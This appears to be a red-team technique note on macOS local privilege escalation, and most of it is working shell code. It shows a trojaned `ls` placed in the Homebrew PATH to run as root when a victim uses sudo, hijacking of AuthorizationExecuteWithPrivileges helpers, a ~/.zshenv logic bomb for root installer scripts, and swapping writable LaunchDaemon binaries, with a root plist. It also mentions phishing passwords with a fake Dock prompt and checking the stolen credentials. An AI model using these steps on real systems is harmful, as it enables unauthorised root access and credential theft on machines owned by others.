---
title: "macOS Privilege Escalation"
type: technique
tags: [macos, privesc, post-exploitation]
phase: privilege-escalation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## Local privilege escalation vectors

macOS local privesc leans on user-context weaknesses rather than kernel bugs. The highest-yield vectors: sudo preserves the user's `PATH` (hijack a Homebrew binary already in PATH), the legacy `AuthorizationExecuteWithPrivileges` trampoline invokes a user-writable helper, root LaunchDaemon XPC/Mach services validate clients weakly, and PackageKit historically ran install scripts as root inside the user's environment.

Sudo PATH hijack (Terminal users almost always have `/opt/homebrew/bin` in PATH):

```bash
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
[ "$(id -u)" -eq 0 ] && whoami > /tmp/privesc
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls
# when the victim runs: sudo ls  -> your code runs as root
```

Privileged helper / XPC triage (root LaunchDaemons in `/Library/PrivilegedHelperTools`; bugs are missing or PID-race client validation, or root methods consuming user-controlled paths/scripts):

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | grep -Ei 'identifier|TeamIdentifier'
  strings "$f" | grep -Ei 'NSXPC|xpc_connection|AuthorizationCopyRights|/Applications/.+\.sh'
done
```

AuthorizationExecuteWithPrivileges trampoline abuse (deprecated but still works): watch for updaters calling the trampoline, then replace the user-writable helper they invoke so your payload rides the legitimate root prompt:

```bash
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
cp /tmp/payload "$HOME/Library/Application Support/Target/helper" && chmod +x "$HOME/Library/Application Support/Target/helper"
```

PackageKit script env inheritance (CVE-2024-27822 class, pre-14.5): expand a vendor pkg, and if an install script is `#!/bin/zsh`, it sources the attacker's `~/.zshenv` as root:

```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
echo 'id > /tmp/pkg-root' >> ~/.zshenv   # logic bomb for zsh-based installers
```

Also worth naming: Dock impersonation of Chrome/Finder to phish a password via osascript, and validating captured passwords non-interactively with `dscl . -authonly "$user" "$pw"` before driving `sudo -S`.

## Writable LaunchDaemon and plist privesc

If a root LaunchDaemon plist or the binary it launches is user-writable, replace it and force launchd to reload it as root. This is the same launchd mechanism as persistence (see [[macos-persistence]]), but pointed at a root-owned daemon slot for escalation (CVE-2025-24085 pattern). Enumerate daemon plists and their target programs first, looking for anything writable by the current user.

```bash
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | grep -Ei 'Program|Label|MachServices'
ls -l /Library/LaunchDaemons /Library/PrivilegedHelperTools   # hunt group/other-writable
```

Swap a writable daemon target and reload:

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.vendor.helper.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/helper && chmod 755 /Library/PrivilegedHelperTools/helper
sudo launchctl bootstrap system /Library/LaunchDaemons/com.vendor.helper.plist
```

Minimal root daemon plist (RunAtLoad fires it immediately):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.vendor.helper</string>
  <key>ProgramArguments</key><array><string>/Library/PrivilegedHelperTools/helper</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
```
